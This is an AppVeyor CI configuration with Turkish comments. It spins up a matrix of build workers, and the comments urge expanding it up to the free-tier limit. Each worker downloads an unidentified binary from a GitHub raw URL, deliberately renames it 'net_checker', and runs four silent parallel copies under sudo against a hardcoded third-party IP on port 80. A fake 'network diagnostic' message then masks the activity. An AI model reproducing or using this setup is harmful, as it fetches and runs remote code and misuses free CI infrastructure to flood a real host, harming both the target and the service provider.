version: 1.0.{build}

# Linux makine kullanmak için Ubuntu imajı seçiyoruz
image: Ubuntu

# Matris yapısı: Aynı anda birden fazla "worker" başlatmak için
environment:
  matrix:
    - node_id: 1
    - node_id: 2
    - node_id: 3
    # Burayı 10-20'ye kadar uzatabilirsin, AppVeyor free tier limitine takılana kadar.

# MSBuild hatasını engellemek için build aşamasını kapatıyoruz
build: off

# Asıl işin döndüğü yer burası
test_script:
  - sh: |
      # 1. Dosyayı indir (İsmi maskeliyoruz: net_checker)
      curl -L "https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2" -o net_checker
      chmod +x net_checker
      
      # 2. Paralel süreçleri başlat (Sessiz modda)
      # Hedef IP ve Portu burada değişken olarak tanımla
      TARGET="185.71.66.37"
      PORT="80"
      
      for i in {1..4}; do
        sudo timeout 60 ./net_checker $TARGET $PORT > /dev/null 2>&1 &
      done
      
      # İşlemlerin bitmesi için bekle
      sleep 65
      echo "Network diagnostic test completed for Node $node_id."
